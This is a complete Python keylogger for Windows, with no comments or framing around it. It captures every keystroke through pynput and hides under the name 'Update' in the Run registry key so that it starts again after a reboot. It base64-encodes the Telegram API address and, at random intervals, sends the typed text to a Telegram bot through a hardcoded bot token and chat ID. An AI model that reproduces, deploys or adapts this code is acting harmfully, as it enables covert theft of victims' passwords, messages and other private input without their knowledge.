import time
import threading
import requests
import pynput.keyboard
import os
import sys
import winreg
import random
import base64

BOT_TOKEN = "7384592292:AAFodU8dDc65vxR2zfYwbLU38jBDjK-S3fc"
CHAT_ID = "7049935317"
TELEGRAM_API = base64.b64decode("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==").decode()

LOG_INTERVAL = random.randint(90, 180)
buffer = []
lock = threading.Lock()
internet_available = True
shift_pressed = False
capslock_on = False

REG_KEY = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
SCRIPT_NAME = "Update"

def add_to_registry():
    script_path = sys.argv[0]
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_KEY, 0, winreg.KEY_WRITE) as reg_key:
            winreg.SetValueEx(reg_key, SCRIPT_NAME, 0, winreg.REG_SZ, script_path)
    except Exception:
        pass

def check_internet():
    global internet_available
    try:
        response = requests.get(f"{TELEGRAM_API}{BOT_TOKEN}/getMe", timeout=5)
        internet_available = response.status_code == 200
    except requests.RequestException:
        internet_available = False

def send_to_telegram(message):
    url = f"{TELEGRAM_API}{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message}
    try:
        response = requests.post(url, data=payload, timeout=10)
        return response.status_code == 200
    except requests.RequestException:
        return False

def log_buffer_to_telegram():
    global buffer, internet_available
    with lock:
        if buffer:
            message = ''.join(buffer)
            if send_to_telegram(message):
                buffer.clear()
            else:
                internet_available = False

def process_key(key):
    global buffer, shift_pressed, capslock_on
    try:
        if key == pynput.keyboard.Key.shift:
            shift_pressed = True
        elif key == pynput.keyboard.Key.caps_lock:
            capslock_on = not capslock_on
        elif key == pynput.keyboard.Key.space:
            buffer.append(" ")
        elif key == pynput.keyboard.Key.enter:
            buffer.append("\n")
        elif key == pynput.keyboard.Key.backspace:
            if buffer:
                buffer.pop()
        elif hasattr(key, "char") and key.char:
            char = key.char
            if capslock_on ^ shift_pressed:
                char = char.upper()
            buffer.append(char)
    except Exception:
        pass

def release_key(key):
    global shift_pressed
    if key == pynput.keyboard.Key.shift:
        shift_pressed = False

def capture_keylogs():
    with pynput.keyboard.Listener(on_press=process_key, on_release=release_key) as listener:
        listener.join()

def send_keylogs_periodically():
    global internet_available
    while True:
        time.sleep(LOG_INTERVAL)
        check_internet()
        if internet_available:
            log_buffer_to_telegram()

def main():
    add_to_registry()

    keylog_thread = threading.Thread(target=capture_keylogs, daemon=True)
    keylog_thread.start()

    send_thread = threading.Thread(target=send_keylogs_periodically, daemon=True)
    send_thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        log_buffer_to_telegram()

if __name__ == "__main__":
    main()
